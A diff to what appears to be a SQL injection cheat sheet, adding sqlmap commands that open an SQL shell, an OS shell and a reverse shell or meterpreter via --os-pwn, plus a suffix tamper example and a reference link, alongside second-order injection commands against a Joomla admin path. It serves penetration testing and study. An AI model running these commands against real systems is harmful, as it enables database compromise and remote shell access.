@@ -43,6 +43,22 @@ python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wis
 sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
 
+Shell
+```
+SQL Shell
+python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
+
+Simple Shell
+python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
+
+Dropping a reverse-shell / meterpreter
+python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
+```
+
+Using suffix to tamper the injection
+```
+python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
+```
 
 General tamper option and tamper's list
 ```
@@ -338,3 +354,5 @@ mysql> mysql> select version();
 * Second Order:
   - [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
   - [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
+* Sqlmap:
+  - [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
